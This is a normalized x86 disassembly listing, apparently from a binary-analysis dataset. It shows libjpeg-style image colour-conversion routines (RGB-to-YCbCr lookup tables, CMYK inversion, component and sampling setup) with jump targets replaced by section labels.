push 0x2000
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0xff
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
imul edx edx 0x4c8b
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0x9646
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x400 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0x1d2f
add edx 0x8000
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x800 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0xffffd4cd
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0xc00 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0xffffab33
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x1000 ] edx
mov edx [ ebp - 0xc ]
shl edx 0xf
add edx rw-data
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x1400 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0xffff94d1
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x1800 ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0xffffeb2f
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x1c00 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_4328b0
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x2c ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
add eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0x14 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x1
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x2c ]
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + 0x2 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x3
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
add ecx [ eax + edx * 4 + 0x400 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
add ecx [ eax + edx * 4 + 0x800 ]
sar ecx 0x10
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x28 ]
mov [ edx ] cl
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 + 0xc00 ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x1000 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x1400 ]
sar edx 0x10
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov [ eax ] dl
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 + 0x1400 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
add eax [ edx + ecx * 4 + 0x1800 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + ecx * 4 + 0x1c00 ]
sar eax 0x10
mov ecx [ ebp - 0x24 ]
add ecx [ ebp - 0x28 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp + 0x18 ]
sub eax 0x1
mov [ ebp + 0x18 ] eax
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
sub_432a20
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x24 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
add eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x14 ]
add edx 0x1
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x1 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax + 0x2 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x3
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x400 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x800 ]
sar edx 0x10
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x20 ]
mov [ eax ] dl
jmp r-xdata
mov eax [ ebp + 0x18 ]
sub eax 0x1
mov [ ebp + 0x18 ] eax
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
sub_432b10
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x30 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
add eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0x14 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0xc ]
mov eax [ ebp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0x14 ]
add edx 0x1
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x30 ]
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov ecx 0xff
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + 0x1 ]
mov ecx 0xff
sub ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + 0x2 ]
mov ecx 0xff
sub ecx eax
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x2c ]
mov eax [ ebp - 0x18 ]
mov cl [ eax + 0x3 ]
mov [ edx ] cl
mov edx [ ebp - 0x18 ]
add edx 0x4
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x400 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
add edx [ ecx + eax * 4 + 0x800 ]
sar edx 0x10
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x2c ]
mov [ eax ] dl
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 + 0xc00 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
add eax [ edx + ecx * 4 + 0x1000 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + ecx * 4 + 0x1400 ]
sar eax 0x10
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x2c ]
mov [ ecx ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + edx * 4 + 0x1400 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
add ecx [ eax + edx * 4 + 0x1800 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
add ecx [ eax + edx * 4 + 0x1c00 ]
sar ecx 0x10
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x2c ]
mov [ edx ] cl
jmp r-xdata
mov eax [ ebp + 0x18 ]
sub eax 0x1
mov [ ebp + 0x18 ] eax
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_432cb0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x14 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x4
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp + 0x14 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x14 ]
add eax 0x1
mov [ ebp + 0x14 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx ]
mov [ eax ] dl
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x18 ]
sub ecx 0x1
mov [ ebp + 0x18 ] ecx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_432d40
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x18 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov edx [ ebp + 0xc ]
add edx 0x4
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x14 ]
add eax 0x1
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x18 ]
sub ecx 0x1
mov [ ebp + 0x18 ] ecx
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov al [ edx ]
mov [ ecx ] al
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_432e00
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x20
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x13c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_4337c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_433ee0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_433f30
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_432f30
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xac ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xd4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xa8 ] 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_433270
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb2 ] 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xd4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb2 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xa8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xa8 ]
shl ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xb2 ]
test edx edx
je r-xdata
jmp r-xdata
sub_432f30
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x20
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x29
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0xffdc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0xffdc
jle r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x38 ] 0x8
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x46
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x1c ]
imul edx [ ecx + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xc ]
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
jg r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0xa
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xf
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0xffdc
jg r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xd8 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xdc ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1a
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] 0xa
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x12
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x8 ] 0x4
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xdc ]
shl ecx 0x3
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xe0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xd8 ]
shl edx 0x3
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + 0x1c ]
imul edx [ ecx + 0x8 ]
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x20 ]
imul eax [ edx + 0xc ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xd8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x1c ]
imul eax [ edx + 0x8 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x20 ]
imul eax [ edx + 0xc ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x2c ] eax
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xd8 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x54
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xdc ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + 0xd8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0xdc ]
cmp eax [ edx + 0xc ]
jle r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0xc ] 0x4
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x54
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0xdc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0xd8 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
sub_433270
push ebp
mov ebp esp
sub esp 0xa78
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xa8 ] 0x0
jg r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xac ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x13
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0xd4 ] 0x1
lea ecx [ ebp - 0xa38 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x18 ] 0x3f
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xd4 ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ ebp - 0x14 ] 0x40
jge r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp + eax - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0xa8 ]
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0xffffffff
mov ecx [ ebp - 0x38 ]
add ecx 0x4
mov [ ebp - 0x38 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xd4 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1a
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0xc ] 0x4
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ ebp + eax - 0x34 ]
test ecx ecx
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
shl eax 0x8
cmp [ ebp + eax - 0xa38 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xd4 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x4 ]
